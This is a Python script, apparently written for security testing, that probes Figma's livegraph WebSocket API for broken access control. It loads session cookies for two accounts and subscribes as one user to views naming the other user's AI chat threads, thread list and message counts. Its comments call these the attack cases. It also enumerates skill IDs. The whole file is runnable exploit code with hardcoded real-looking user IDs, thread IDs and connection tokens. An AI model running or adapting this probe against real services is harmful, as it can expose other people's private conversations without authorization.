# -*- coding: utf-8 -*-
"""对照判定: 用 A 真实 AI 线程 ID, B 身份 vs A 身份
ActiveAiChatThreadView / AiChatThreadMessageCountView / PaginatedUserAiChatThreadsView
基线: A 身份查自己线程(确认线程存在且 view 正常)
攻击: B 身份查 A 线程(ownerId=A) -> 若返回 = 越权
"""
import sys, json, io, asyncio, time, urllib.parse, uuid, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import websockets

B_UID = "1667396392129259941"
A_UID = "1666382703778278399"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
A_THREAD = "ee5997d9-bbdb-4912-9587-9022c14c0be0"
A_THREAD2 = "28e728c0-dd4d-46e4-9b34-26cfb69e0aed"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"


def make_abs_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split("; "):
        if "=" in p:
            k, v = p.split("=", 1)
            parts[k] = v
    d = json.loads(urllib.parse.unquote(parts.get("__Host-figma.authn", "")))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts["__Host-figma.authn"] = urllib.parse.quote(json.dumps(d, separators=(",", ":")))
    if "__Host-figma.embed" in parts:
        try:
            ne = json.loads(urllib.parse.unquote(parts["__Host-figma.embed"]))
            ne = {k: v for k, v in ne.items() if k == keep_uid}
            if ne:
                parts["__Host-figma.embed"] = urllib.parse.quote(json.dumps(ne, separators=(",", ":")))
            else:
                del parts["__Host-figma.embed"]
                parts.pop("__Host-figma.embed.mac", None)
        except Exception:
            pass
    return "; ".join(f"{k}={v}" for k, v in parts.items())


rawB = io.open("ws_cookie_B_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_B = make_abs_pure(rawB, B_UID)
rawA = io.open("ws_cookie_A_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_A = make_abs_pure(rawA, A_UID)

OUT = io.open("_ws_ai_skill_out2.txt", "w", encoding="utf-8")


def lg_url(fk, uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")


async def sub(view, args, fk, uid, ck, wait=9):
    frames = []
    try:
        async with websockets.connect(lg_url(fk, uid),
                                      additional_headers={"User-Agent": UA, "Cookie": ck,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=30) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": uid, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{fk}"},
                                      "clientRequestedVersion": 2}))
            for _ in range(3):
                m = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(m, str) and "authSuccess" in m:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view,
                                      "viewHash": "0" * 32, "loadType": "initial",
                                      "args": args}))
            deadline = time.time() + wait
            while time.time() < deadline:
                try:
                    m = await asyncio.wait_for(ws.recv(), timeout=3)
                except asyncio.TimeoutError:
                    continue
                if isinstance(m, str):
                    frames.append(m)
                    if "viewLoaded" in m or "viewSubscriptionFailed" in m:
                        break
    except Exception as e:
        return [f"ERR {type(e).__name__}: {str(e)[:80]}"]
    return frames


async def run_case(label, view, args, uid, ck, fk=A_MAKE):
    frames = await sub(view, args, fk, uid, ck, wait=9)
    txt = " ".join(frames)
    has_data = any('"initial":{' in f and '"initial":{}' not in f for f in frames)
    m = re.search(r'Status code = (\d+). Error message = .*?"message":"([^"]*)"', txt)
    if has_data:
        tag = "⭐返回数据"
    elif m:
        tag = f"⚠{m.group(1)} {m.group(2)[:50]}"
    elif any("argument error" in f or "Missing argument" in f for f in frames):
        tag = "⚠参数错误"
    elif any("error" in f.lower() for f in frames):
        tag = "⚠有错误"
    else:
        tag = "空壳"
    print(f"[{label}] {tag} 帧数={len(frames)}")
    OUT.write(f"\n===== [{label}] {view} {tag} =====\n")
    for f in frames:
        OUT.write(f"  {f[:2000]}\n")
        if has_data:
            print(f"  🖼 {f[:1500]}")


async def main():
    t1 = {"ownerId": A_UID, "id": A_THREAD, "__requestId": str(uuid.uuid4())}
    t2 = {"ownerId": A_UID, "id": A_THREAD2, "__requestId": str(uuid.uuid4())}

    print("=== 1) ActiveAiChatThreadView: B 打 A 线程 vs A 基线 ===")
    await run_case("B→A_THREAD1", "ActiveAiChatThreadView", t1, B_UID, ABS_B)
    await asyncio.sleep(0.4)
    await run_case("B→A_THREAD2", "ActiveAiChatThreadView", t2, B_UID, ABS_B)
    await asyncio.sleep(0.4)
    await run_case("基线A→A_THREAD1", "ActiveAiChatThreadView", t1, A_UID, ABS_A)
    await asyncio.sleep(0.4)

    print("\n=== 2) AiChatThreadMessageCountView ===")
    await run_case("B→A_THREAD1", "AiChatThreadMessageCountView", t1, B_UID, ABS_B)
    await asyncio.sleep(0.4)
    await run_case("基线A→A_THREAD1", "AiChatThreadMessageCountView", t1, A_UID, ABS_A)
    await asyncio.sleep(0.4)

    print("\n=== 3) PaginatedUserAiChatThreadsView: A 身份基线 ===")
    await run_case("基线A→A列表", "PaginatedUserAiChatThreadsView",
                   {"ownerId": A_UID, "userId": A_UID, "firstPageSize": 25,
                    "__requestId": str(uuid.uuid4())}, A_UID, ABS_A)
    await asyncio.sleep(0.4)
    await run_case("B→A列表", "PaginatedUserAiChatThreadsView",
                   {"ownerId": A_UID, "userId": A_UID, "firstPageSize": 25,
                    "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
    await asyncio.sleep(0.4)

    print("\n=== 4) CustomSkillDetailView: snowflake 量级判定 ===")
    for sid in ["1666382703778278399", "1000000000000000000"]:
        await run_case(f"skillId={sid}", "CustomSkillDetailView",
                       {"skillId": sid, "__requestId": str(uuid.uuid4())}, B_UID, ABS_B)
        await asyncio.sleep(0.3)

    OUT.close()


asyncio.run(main())
